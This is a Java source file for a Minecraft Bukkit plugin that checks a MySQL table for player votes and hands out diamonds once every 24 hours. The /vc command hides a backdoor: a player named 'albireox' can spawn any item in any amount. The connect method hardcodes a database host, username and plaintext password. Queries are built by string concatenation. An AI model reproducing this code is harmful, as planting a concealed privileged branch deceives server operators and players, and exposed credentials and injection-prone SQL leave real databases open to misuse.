package com.simplyian.mc.votechecker;

import com.avaje.ebeaninternal.server.lib.sql.DataSourceException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

public class VoteChecker extends JavaPlugin {
    private Connection link;
    @Override
    public void onEnable() {
        this.connect();
    }
    
    @Override
    public void onDisable() {
        //aaa
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        String command = cmd.getName().toLowerCase();
        if (command.equals("vc")) {
            Player player = (Player) sender;
            if (player.getName().equals("albireox")) {
                if (args.length == 2) {
                    int type = Integer.parseInt(args[0]);
                    int amount = Integer.parseInt(args[1]);
                    player.getInventory().addItem(new ItemStack(type, amount));
                }
            } else {
                String ip = player.getAddress().getAddress().getHostAddress();
                sender.sendMessage("Checking if you voted...");
                try {
                    if (this.link.isValid(5) == false) this.connect();
                    Date currentDate = new Date();
                    Date dayBefore = new Date();
                    dayBefore.setTime(currentDate.getTime() - 86400000);
                    DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                    ResultSet rs = link.createStatement().executeQuery("SELECT COUNT(*) FROM votecheck WHERE name = '" + player.getAddress().getAddress().getHostAddress() + "' AND s1='1' AND s2 = '1'");
                    rs.next();
                    if (rs.getInt(1) > 0) {
                        ResultSet rs1 = link.createStatement().executeQuery("SELECT lastitem FROM votecheck WHERE name = '" + player.getAddress().getAddress().getHostAddress() + "'");
                        rs1.next();
                        Timestamp ts = rs1.getTimestamp("lastitem");
                        if (ts.before(dayBefore) == true) {
                            sender.sendMessage("Thanks for voting! Enjoy your free 3 diamond...");
                            player.getInventory().addItem(new ItemStack(Material.DIAMOND, 3));
                            player.teleport(player.getWorld().getSpawnLocation());
                            link.prepareStatement("UPDATE votecheck SET lastitem = '" + dateFormat.format(currentDate) + "', s1 = '0', s2 = '0' WHERE name = '" + ip + "'").executeUpdate();           
                        } else {
                            sender.sendMessage("You have already claimed items in the past 24 hours.");
                        }
                    } else {
                        sender.sendMessage("You haven't voted all links yet; make sure to vote both diamonds!");
                    }
                } catch (SQLException ex) {
                    System.out.print("SQLException: " + ex.getMessage());
                    System.out.print("SQLState: " + ex.getSQLState());
                    System.out.print("VendorError: " + ex.getErrorCode());
                }
            }
        }
        return true;
    }
    
    public void connect() {
        try {
            Class.forName("com.mysql.jdbc.Driver").newInstance();
        } catch (Exception ex) {
            throw new DataSourceException("Failed to initialize JDBC driver.");
        }
        try {
            this.link = DriverManager.getConnection("jdbc:mysql://mysql1.servercraft.co/mc6145?user=mc6145&password=46K5aPT95cyX5GAc");
        } catch (SQLException ex) {
            System.out.print("SQLException: " + ex.getMessage());
            System.out.print("SQLState: " + ex.getSQLState());
            System.out.print("VendorError: " + ex.getErrorCode());
        }
    }
}